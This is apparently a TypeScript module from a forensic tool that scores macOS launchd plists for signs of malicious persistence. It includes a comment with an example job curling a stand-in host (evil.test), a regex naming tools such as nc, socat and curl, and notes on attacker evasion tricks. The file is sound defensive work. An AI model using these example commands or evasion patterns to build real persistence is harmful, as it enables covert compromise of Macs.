// macOS persistence GRADING (#908 item 6). Parsing is in macosPersistence.ts.
//
// ─────────────────────────── THE CONSTRAINT THE ISSUE SETS ───────────────────────────
//
// "Unsigned software or a legitimate LaunchAgent alone should not trigger a high-confidence
// finding." That is not a soft preference on a Mac. Every Homebrew formula, every developer tool,
// every internal build and a large share of commercial software is unsigned or ad-hoc signed, and
// almost every application installs a LaunchAgent. A rule that fires on either produces a page of
// findings on a clean laptop and the analyst stops reading the panel.
//
// So signing status is a CONTRIBUTOR here and never a finding. It sharpens a job that is already
// suspicious for a reason of its own — a payload in a writable directory, an Apple-looking label on
// something Apple did not ship, a command that downloads and runs code. On its own it says nothing.
//
// ─────────────────────────── WHAT COMBINES ───────────────────────────
//
//   • a program in a directory anything can write, or a hidden one
//   • a label that claims to be Apple on a job Apple did not ship
//   • a command that fetches and executes, decodes itself, or opens a reverse shell
//   • a job that survives being killed (KeepAlive) and starts by itself (RunAtLoad)
//   • quarantine evidence that the program was downloaded from the internet
//   • signing status, when the collection recorded it
//
// The first three each stand alone. The rest raise or explain; none of them creates a finding.

import type { Severity } from "./stateTypes.js";
import type { CollectedFile } from "./linuxPersistence.js";
import { judgePayload, homeAccount, type LinuxContext, type LinuxSignal } from "./linuxPersistRules.js";
import {
  isBinaryPlist,
  lastPlistTruncated,
  launchScope,
  parsePlist,
  readLaunchJob,
  type LaunchJob,
  type LaunchScope,
} from "./macosPersistence.js";

// Directories on macOS that any process can write, and nothing installed should run from.
//
// Two regexes, and the difference matters. The first is anchored and judges the PROGRAM path, where
// a removable volume or a Downloads folder is a real signal. The second is unanchored and judges the
// whole command, because `/bin/sh /private/tmp/x.sh` runs sh — the code is the argument, and an
// anchored test read that job as running from /bin. It covers only the genuinely transient
// directories: a backup job with a `/Volumes/Backup` ARGUMENT is ordinary, and sweeping that in
// would have been a false positive on every Mac with an external disk.
// /private/var/root is root's HOME DIRECTORY, and it is not writable by anything but root — calling
// it "a directory any process can write" was simply false. A root-owned helper living there is
// unusual, not world-writable, and it is judged by the home-directory rule instead.
const MAC_TRANSIENT_RE =
  /^\/(?:private\/)?(?:tmp|var\/tmp|var\/folders)\/|^\/Users\/Shared\/|^\/Volumes\/|^\/Users\/[^/]+\/(?:Downloads|Public)\//i;

const MAC_TRANSIENT_ARG_RE =
  /(?:^|[\s"'=(])\/(?:private\/)?(?:tmp|var\/tmp|var\/folders)\/|(?:^|[\s"'=(])\/Users\/Shared\//i;

/**
 * Where Apple's own launchd programs live.
 *
 * Xcode's helpers are labelled com.apple.dt.* and live inside /Applications/Xcode.app, so a rule
 * that knew only /System called every one of them a misleading label on a developer Mac.
 */
const APPLE_PROGRAM_RE =
  /^\/(?:System\/|usr\/(?:libexec|sbin|bin|lib)\/|Library\/(?:Apple|Developer)\/|Applications\/(?:Xcode(?:-beta)?\.app|Safari\.app|Utilities\/)|private\/var\/db\/)/;

/**
 * Apple SHIPS these, and macOS persistence almost always drives one of them.
 *
 * Treating any /usr/bin path as "Apple's own program" let a job labelled com.apple.updated run
 * `/usr/bin/curl http://evil.test/x` with no finding at all. Being shipped by Apple is not the
 * same as being an Apple SERVICE, and these are the ones an operator reaches for.
 */
const APPLE_SHIPPED_TOOL_RE =
  /\/(?:curl|python[\d.]*|perl|ruby|php|osascript|open|nc|ncat|socat|ssh|scp|sftp|screen|tclsh|expect|env|xargs|bash|sh|zsh|ksh|csh|tcsh|awk|sed|defaults|launchctl|security|softwareupdate|automator|caffeinate)$/;

/** Ordinary hidden directories on a Mac. A payload under one of these is not remarkable for hiding. */
const ORDINARY_HIDDEN = new Set([
  ".config",
  ".local",
  ".ssh",
  ".docker",
  ".vscode",
  ".cargo",
  ".rustup",
  ".nvm",
]);

const RANK: Record<Severity, number> = { Info: 0, Low: 1, Medium: 2, High: 3, Critical: 4 };
const EVIDENCE_MAX = 300;

/** Optional facts a collection can supply per file. Absent means NOT COLLECTED, never "no". */
export interface MacFileFacts {
  /** `unsigned`, `adhoc`, a Team ID, or "" when the collection did not run codesign. */
  signing?: string;
  /** The `com.apple.quarantine` xattr's download URL, when the collection read it. */
  quarantineUrl?: string;
}

export interface MacContext extends LinuxContext {
  /** Keyed by the PROGRAM path, not the plist path — the fact is about the binary. */
  facts?: Record<string, MacFileFacts>;
  /** Baseline of launchd labels this environment expects. */
  knownLabels?: readonly string[];
}

/** Signing and quarantine facts a collection attached to this plist's header. */
function factsFor(file: CollectedFile): MacFileFacts | undefined {
  const extra = file.extra;
  if (!extra) return undefined;
  const signing = extra.codesign ?? extra.signature;
  const quarantineUrl = extra.quarantine;
  if (!signing && !quarantineUrl) return undefined;
  return { ...(signing ? { signing } : {}), ...(quarantineUrl ? { quarantineUrl } : {}) };
}

function clip(s: string): string {
  const t = (s ?? "").replace(/\s+/g, " ").trim();
  return t.length > EVIDENCE_MAX ? `${t.slice(0, EVIDENCE_MAX)}…` : t;
}

function hidden(path: string): boolean {
  return (path ?? "")
    .split("/")
    .some((seg) => seg.startsWith(".") && seg.length > 1 && seg !== ".." && !ORDINARY_HIDDEN.has(seg));
}

/** Does the label claim Apple? */
export function claimsApple(label: string): boolean {
  return /^com\.apple\./i.test((label ?? "").trim());
}

/**
 * A label that claims Apple on a job Apple did not ship.
 *
 * Both halves are required. `com.apple.*` under /System/Library IS Apple's, and a third-party job
 * with an honest label is not misleading. The finding is the mismatch, which is a deliberate act.
 */
export function misleadingLabel(job: LaunchJob, scope: LaunchScope): boolean {
  if (!claimsApple(job.label)) return false;
  if (scope === "apple") return false;
  // An interpreter or transfer tool is shipped by Apple but is not an Apple service, so its path
  // does not vouch for a com.apple.* label the way /usr/libexec/softwareupdated does.
  if (APPLE_SHIPPED_TOOL_RE.test(job.program)) return true;
  return !APPLE_PROGRAM_RE.test(job.program);
}

/** Who runs this job, in words the analyst can act on. */
export function runsAs(job: LaunchJob, scope: LaunchScope): string {
  if (job.userName) return job.userName;
  if (scope === "system-daemon") return "root at boot";
  if (scope === "system-agent") return "each user at login";
  if (scope === "user-agent") return "that user at login";
  return "an unknown context";
}

export interface MacJudgement {
  /** The PROGRAM itself sits in a world-writable directory. */
  transient: boolean;
  /** A world-writable directory is only REFERENCED — an argument, a log target, a scan root. */
  transientRef: boolean;
  hiddenPath: boolean;
  fetchExec: boolean;
  reverseShell: boolean;
  encoded: boolean;
  misleading: boolean;
  /** The account whose home directory a root-run job executes from, when there is one. */
  rootRunsUserFile: string;
}

export function judgeJob(job: LaunchJob, scope: LaunchScope): MacJudgement {
  // The Linux payload grader reads the command text; the path rules are macOS's own.
  //
  // EnvironmentVariables is read as part of both. DYLD_INSERT_LIBRARIES is macOS persistence in one
  // key — the program can be entirely legitimate while the library loaded into it is not — and
  // reading only the command line missed it completely.
  const env = Object.values(job.environment).join(" ");
  const text = `${job.commandLine} ${env}`.trim();
  const j = judgePayload(text);
  // The PROGRAM being in a world-writable directory and the command merely MENTIONING one are
  // different facts. `/usr/bin/find /private/tmp -mtime +7 -delete` runs from /usr/bin and cleans
  // /tmp; reporting it as "runs a program from a directory any process can write" was false, on a
  // High-severity forensic event.
  // When the program is an interpreter, the SCRIPT is what runs — `/bin/sh /private/tmp/x.sh` runs
  // the file in /tmp, and calling that a mere reference would be as wrong as the opposite mistake.
  // Same for a library the job injects: DYLD_INSERT_LIBRARIES names code that will execute.
  const wrapper = /\/(?:(?:ba|z|k|da|a)?sh|python[\d.]*|perl|ruby|osascript|node|php|open|env)$/i.test(
    job.program,
  );
  const programTransient =
    MAC_TRANSIENT_RE.test(job.program) ||
    (wrapper && job.arguments.some((a) => MAC_TRANSIENT_RE.test(a))) ||
    Object.values(job.environment).some((v) => MAC_TRANSIENT_RE.test(v));
  return {
    transient: programTransient,
    transientRef: !programTransient && MAC_TRANSIENT_ARG_RE.test(text),
    // Hidden paths are read from the ARGUMENTS too: `Program=/usr/bin/osascript` with an argument
    // of `~/.cache/.update.scpt` is the ordinary shape of macOS persistence, and reading only the
    // program missed all of it.
    hiddenPath:
      hidden(job.program) || job.arguments.some(hidden) || Object.values(job.environment).some(hidden),
    fetchExec: j.fetchExec,
    reverseShell: j.reverseShell,
    encoded: j.encoded,
    misleading: misleadingLabel(job, scope),
    // A LaunchDaemon runs as root at boot. If what it runs lives in a user's home directory, that
    // user can change what root runs — the same rule the Linux side has had all along, and macOS
    // had none of it because homeAccount() did not know /Users.
    rootRunsUserFile:
      !job.userName && (scope === "system-daemon" || scope === "system-agent")
        ? (homeAccount(job.program) ?? "")
        : "",
  };
}

/** Does anything here stand on its own? Signing and persistence flags deliberately do not. */
function standsAlone(m: MacJudgement): boolean {
  return m.reverseShell || m.fetchExec || m.encoded || m.transient || m.misleading;
}

/** A reference to a world-writable directory is worth reporting, but not at the same weight. */
function worthReporting(m: MacJudgement): boolean {
  return standsAlone(m) || m.hiddenPath || m.transientRef || !!m.rootRunsUserFile;
}

function primaryReason(m: MacJudgement, job: LaunchJob, scope: LaunchScope): string {
  const who = runsAs(job, scope);
  if (m.misleading) {
    return `This launchd job is labelled "${job.label}", which claims to be Apple's, but it is not in /System/Library and the program it runs is not one of Apple's. Apple does not install jobs anywhere else. It runs as ${who}.`;
  }
  if (m.reverseShell)
    return `A launchd job running as ${who} opens an interactive connection back to a remote host.`;
  if (m.fetchExec)
    return `A launchd job running as ${who} downloads code and executes it in the same command, so the payload never has to exist on disk before it runs.`;
  if (m.encoded) return `A launchd job running as ${who} decodes its own payload before running it.`;
  if (m.rootRunsUserFile) {
    return `A launchd job runs as ${who} but executes a program inside ${m.rootRunsUserFile}'s home directory, so that account can change what root runs.`;
  }
  if (m.transient)
    return `A launchd job running as ${who} runs a program from a directory any process can write. Installed software does not live there.`;
  if (m.hiddenPath)
    return `A launchd job running as ${who} runs from, or loads, something in a hidden directory.`;
  return `A launchd job running as ${who} references a directory any process can write. Check whether that path is what runs or only where output goes — the program itself is ${job.program}.`;
}

const MITRE_BY_SCOPE: Record<LaunchScope, string> = {
  apple: "T1543.001",
  "system-daemon": "T1543.004",
  "system-agent": "T1543.001",
  "user-agent": "T1543.001",
  elsewhere: "T1543.001",
};

/**
 * Grade one collected launchd plist.
 *
 * Returns at most one signal per job: several reasons for the same job are one finding with several
 * reasons, not several findings. Counting them separately would inflate the panel and imply
 * independent evidence where there is one file.
 */
/** A finding that says the file could not be read, rather than saying nothing. */
function unreadable(file: CollectedFile, reason: string): LinuxSignal {
  return {
    artifact: file.path,
    kind: "launchd",
    severity: "Medium",
    mitre: [],
    reason,
    evidence: clip(file.content.slice(0, 120)),
    line: 1,
    timeUnknown: !file.mtime,
  };
}

export function gradeLaunchd(file: CollectedFile, ctx: MacContext = {}): LinuxSignal[] {
  if (isBinaryPlist(file.content)) {
    return [
      unreadable(
        file,
        "This launchd plist is in the binary format, which is not text and was not read. Nothing about it has been assessed either way. Convert it and re-import: plutil -convert xml1 -o - <file>.",
      ),
    ];
  }

  const plist = parsePlist(file.content);
  const job = plist ? readLaunchJob(plist) : null;

  // A PLIST THAT YIELDS NO PROGRAM MUST SAY SO. Returning nothing made "I could not read this file"
  // indistinguishable from "this file is clean" — a truncated member of a real collection, and a
  // crafted one, both produced "1 artifact file(s) read, 0 finding(s)". The binary-plist branch
  // above already got this right; the XML branch did not.
  if (!plist || !job?.program || lastPlistTruncated()) {
    return [
      unreadable(
        file,
        lastPlistTruncated()
          ? "This launchd plist held more entries than one parse reads, so it was read only in part and the program it runs may not have been reached. Nothing about it has been assessed either way; read the raw file."
          : plist
            ? "This launchd plist parsed, but it names no program to run — either it is not a job, or the file is truncated or malformed. Nothing about it has been assessed either way; read the raw file."
            : "This launchd plist could not be parsed as a property list. Nothing about it has been assessed either way; read the raw file, or convert it with plutil -convert xml1.",
      ),
    ];
  }

  if ((ctx.knownLabels ?? []).includes(job.label)) return [];

  const scope = launchScope(file.path);
  const m = judgeJob(job, scope);
  if (!worthReporting(m)) return [];

  let severity: Severity = standsAlone(m) || m.rootRunsUserFile ? "High" : "Medium";
  // Disabled is only the plist's DEFAULT. `launchctl load -w` overrides it in
  // /var/db/com.apple.xpc.launchd/disabled.plist and the job runs. Dropping the job on this key
  // was a one-line evasion, and a disabled persistence plist is evidence either way.
  if (job.disabled) {
    if (RANK[severity] > RANK.Medium) severity = "Medium";
  }
  let reason = primaryReason(m, job, scope);

  // Everything below EXPLAINS or RAISES. None of it can produce a finding on its own.
  if (job.runAtLoad && job.keepAlive) {
    reason +=
      " It starts by itself and is restarted when it is killed, so stopping the process does not remove it.";
  } else if (job.runAtLoad) reason += " It starts by itself.";
  else if (job.keepAlive) reason += " It is restarted when it is killed.";
  if (job.startInterval !== null && job.startInterval > 0 && job.startInterval <= 300) {
    reason += ` It re-runs every ${job.startInterval} second(s).`;
  }
  if (job.watchPaths.length) reason += ` It also runs whenever ${job.watchPaths[0]} changes.`;
  if (job.disabled) {
    reason +=
      " The plist sets Disabled, which is only the default — `launchctl load -w` overrides it, so this may still be loaded. Check /var/db/com.apple.xpc.launchd/disabled.plist.";
  }

  // The annotation sits on the plist, because the plist is the file the analyst collected — so the
  // file's own `extra` is read first. ctx.facts stays as the route for a collection that recorded
  // signing or quarantine somewhere else, such as a separate xattr listing, keyed by the program.
  const facts: MacFileFacts | undefined = factsFor(file) ?? ctx.facts?.[job.program];
  if (facts?.quarantineUrl) {
    // The strongest corroboration available: this exact binary carries macOS's own record of having
    // been downloaded. It raises, because "installed by a package" and "downloaded and then set to
    // run at every login" are different stories.
    reason += ` The program carries a quarantine record: it was downloaded from ${clip(facts.quarantineUrl)}.`;
    if (RANK[severity] < RANK.High) severity = "High";
  }
  if (facts?.signing === "unsigned" || facts?.signing === "adhoc") {
    reason += ` The program is ${facts.signing === "adhoc" ? "ad-hoc signed" : "unsigned"} — on its own that is ordinary on a Mac, but combined with the above it means nothing vouches for what this file is.`;
  } else if (facts?.signing) {
    reason += ` It is signed by ${clip(facts.signing)}, which does not make it safe but does say who to ask about it.`;
  } else {
    reason += " The collection did not record the program's signing status.";
  }

  const timeUnknown = !file.mtime;
  if (timeUnknown) {
    reason +=
      " The collection recorded no modification time for this plist, so whether it was created during the incident could not be checked.";
  } else if (ctx.incident) {
    const t = Date.parse(file.mtime ?? "");
    const a = Date.parse(ctx.incident.start);
    const b = Date.parse(ctx.incident.end);
    if (
      Number.isFinite(t) &&
      Number.isFinite(a) &&
      Number.isFinite(b) &&
      t >= Math.min(a, b) &&
      t <= Math.max(a, b)
    ) {
      reason += ` The plist was written inside the incident window (${file.mtime}).`;
      if (RANK[severity] === RANK.Medium) severity = "High";
    }
  }

  return [
    {
      artifact: file.path,
      kind: "launchd",
      severity,
      mitre: [
        ...new Set([
          MITRE_BY_SCOPE[scope],
          ...(m.misleading ? ["T1036.005"] : []),
          ...(m.fetchExec ? ["T1105"] : []),
          ...(m.fetchExec || m.encoded || m.reverseShell ? ["T1059.004"] : []),
        ]),
      ],
      reason,
      evidence: clip(`${job.label} → ${job.commandLine}`),
      line: 1,
      timeUnknown,
      target: job.program,
    },
  ];
}
